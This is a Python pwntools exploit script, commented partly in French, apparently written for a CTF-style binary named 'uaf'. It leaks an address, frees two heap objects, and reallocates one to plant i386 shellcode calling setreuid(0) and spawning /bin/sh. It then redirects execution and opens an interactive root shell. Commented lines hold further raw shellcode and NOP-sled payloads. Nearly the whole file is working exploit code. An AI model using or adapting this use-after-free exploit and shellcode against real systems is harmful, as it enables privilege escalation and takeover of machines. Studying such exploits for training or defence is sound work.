#!/usr/bin/python3
# coding: utf8
import pwn
from pwn import *
import struct
from pwnlib.util.packing import *
'''
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
'''

p = pwn.process("./uaf")
p.recv()

print("Creation de 2 interfaces...") 

# Create 1st
p.sendline("1")
p.recv()
#name
p.sendline("a")
p.recv()
#ip
p.sendline("a")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("1")
p.recv()

# Create 2nd
p.sendline("1")
p.recv()
#name
p.sendline("b")
p.recv()
#ip
p.sendline("b")
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("2")
p.recv()

print("Seeking leaked @ now ! ")
p.sendline("5")
text = p.recv()


addr = text[26:33]
#print(addr.hex())
import binascii
addr2=binascii.unhexlify(addr.hex()).decode('utf8')
print(" Adresse turnOn de la struct: %s" % addr2) 
buffer2 = int(addr2,16)- 62
print("buffer @ = 0x%x" % buffer2)
#print("buffer @ = %s" % hex(buffer))

'''
hexa=hex(buffer)[2:]
hexa="".join(reversed([hexa[i:i+2] for i in range(0, len(hexa), 2)]))
final=""
i=0
for h in hexa:
	if i % 2 ==0:
		final=final+'\\x'
	final=final+h
	i=i+1
final=final+"\x00"
print(final)

addr = text[26:34]
print(addr)
unpacked = struct.unpack("<L", addr)[0]
print("@ = 0x%08x" % unpacked)
buffer =unpacked-56
msg = 'A'*12 + struct.pack("<L", buffer)
print(msg)
'''
s= pwnlib.util.packing.p32(buffer2, endian='little')
#pwnlib.util.packing.u64()
#s=buffer
#print(ord(s))
print(s)
#print(binascii.unhexlify(binascii.hexlify(s)))
#print("buffer packed =" + str(s))
#adresse = input("#YourTurn: @? ")
#print(adresse)
#printf '\xde\xad\xbe\xef'



print("Destruction des 2 interfaces crees !") 
#destroy
p.sendline("4")
p.recv()
#select
p.sendline("0")
p.recv()
#interface a
p.sendline("1")
p.recv()
#destroy
p.sendline("4")
p.recv()

print("creation de la 3eme interface...")
# Create 3rd
p.sendline("1")
p.recv()
#name
p.sendline("c")
p.recv()
#20 shellcode+ 12 NOP +4@ (4*6)=56
#Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
#shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90" * 32
#47 shellcode
shellcode="\xeb\x0f\x5e\x31\xc0\xb0\x19\x80\x2e\x08\xfe\xc8\x74\x08\x46\xeb\xf6\xe8\xec\xff\xff\xff\x39\xc8\x58\x70\x37\x37\x7b\x70\x70\x37\x6a\x71\x76\x91\xeb\x58\x91\xea\x5b\x91\xe9\xb8\x13\x88"+"\x90"*6
#+hex(buffer)
#"\xad\xde\xfe\xca"
#"\x44\x33\x22\x11" * 4
#("\xb2\x1a\x00\x80"+"\x11"*4)*4
#final*4
#0x0000000008000ab2
	
# 0x7fffbe2a02f0
#echo `perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xF0\x02\x2A\xBE\xFF\x7F\x00\x00" x 4 '` >/tmp/pipeTest
#"\xee\xa6c\xde\xff\x7f"*4
print("Shellcode: %s" % shellcode)
print("Insertion du shellcode dans le champs ip #strdump")
context.update(arch='i386', os='linux')

shellcode = shellcraft.setreuid(0)+shellcraft.sh() + (shellcraft.nop()*9)
print(shellcode)
print(hexdump(asm(shellcode)))
shellcode = asm(shellcode) 
#ip
#p.send(shellcode)
#print("\xee\xa6c\xde\xff\x7f")
#print(s * 4)
#p.send(s*4)
p.send(shellcode)
#p.sendline(p32(int("8048732",16)))
#ok
p.sendline(s)
p.recv()
#turnon
p.sendline("1")
p.recv()
#save
p.sendline("3")
p.recv()

print("trying...(infos)")
#p.interactive()
p.sendline("0")
p.recv()
p.sendline("2")
p.recv()
p.sendline("6")
print(p.recv())

p.interactive()
